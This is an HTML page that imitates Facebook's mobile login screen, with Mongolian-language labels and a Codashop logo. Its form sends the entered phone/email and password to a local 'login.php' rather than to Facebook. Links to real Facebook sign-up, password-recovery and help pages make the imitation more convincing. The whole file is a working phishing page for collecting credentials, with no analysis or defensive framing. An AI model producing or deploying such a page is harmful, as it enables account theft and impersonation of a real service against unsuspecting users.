<html>
	<head>
		<title>www.facebook.com</title>
		<link rel="shortcut icon" href="" >
		<meta charset='utf-8' >
		<meta name="description" content="Create an account or log in to Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates." >
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" >
		<meta>
		<meta>
	</head>
	<body id="bd">
		<center>
			<div id="toppart">
				<div id="header"> <a href="#"><img src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo.png" height="95%" ></a></div>
				<div id="ffa"> <div style="padding-top:14px;">Get Facebook App For Android</div> </div>
				
				<div class="if">
					<form method="post" action="login.php" >
						<input type="text" name="username" class="ibox" autocomplete="on" placeholder="Утасны дугаар эсвэл э-шуудан" maxlength="30" style="border-radius:5px 5px 0px 0px;" required >
						<input type="password" name="password" autocomplete="on" placeholder="Нууц үг" minlength="6" maxlength="20" class="ibox" style="border-radius:0px 0px 5px 5px; margin-top:-2px;" required >
						<input type="submit" name="submit" value="Нэвтрэх" class="btn login" >
					</form>
					<div class="divider">
						<div style="height:1px; width:280px; background:#ced0d4; margin-top:10px; overflow:hidden; margin-left:-22%;"></div><div style="top:-10px; position:relative; width:20%; background:#eceff5;">эсвэл</div>
					</div>
					<div>
					<a href="https://m.facebook.com/reg/?cid=103&soft=hjk"><button class="btn cna">Шинэ хаяг нээх</button></a>
					</div>
					<div ><a href="https://m.facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F&r&cuid&ars=facebook_login&lwv=100&refid=8" ><button class="fbtn" >Нууц үгээ мартсан уу?</button></a>·<a href="https://m.facebook.com/help/?refid=8" ><button class="fbtn">Тусламжийн хэсэг</button></a><br><br><br></div>
					
				</div>
			</div>
			<div>
				<table class="table">
					<tr><td width="50%" class="tdcg">English (UK)</td>		<td>বাংলা</td></tr>
					<tr><td>অসমীয়া</td>							<td>हिन्दी</td></tr>
					<tr><td>नेपाली</td>								<td>Español</td></tr>
					<tr><td>Português (Brasil)</td>				<td><center><div style="hight:20px; width:18px; border:1px solid#3b5998; border-radius:3px; font-size:15px;">+</div></center></td></tr>
					<tr><td></td>								<td></td></tr>
					<tr ><td colspan="2" class="tdcg">Facebook Inc.<script type="text/javascript"></script></td></tr>
				</table>
			</div>
	
		</center>
		
	</body>
</html>

<style type="text/css">

#bd			{margin:0px 0px 0px 0px; font-family:Arial; font-size:14;}
#toppart	{background-color:#eceff5}
#header		{height:43px; width:100%; background-color:#FFFFFF;}
#ffa		{height:45px; width:100%; background-color:#fffbe2; color:#3b5998; cursor:pointer;}
.if			{width:330px; margin-top:15px;}
.ibox		{height:47px; width:100%; padding:10px 10px 10px 14px; font-size:14; border:1px solid #dbdee4;}
.btn		{height:38px; font-weight:bold; color:#ffffff; border-radius:5px; border:0px; cursor:pointer;}
.login		{background-color:#3578e5; width:100%; margin-top:10px;}
.cna		{background-color:#00a400; width:50%; margin-top:5px;}
.divider	{font-size:14; color:#4b4f56; margin-top:20px; max-width:60%;}
.fbtn		{font-size:12; background-color:#eceff5; border:0px; color:#7596c8; margin-top:10px;}
.table		{height:; width:100%; text-align:center; color:#3b5998; cursor:pointer; font-size:12px; margin-top:15px;}
.tdcg		{color:gray;}
</style>

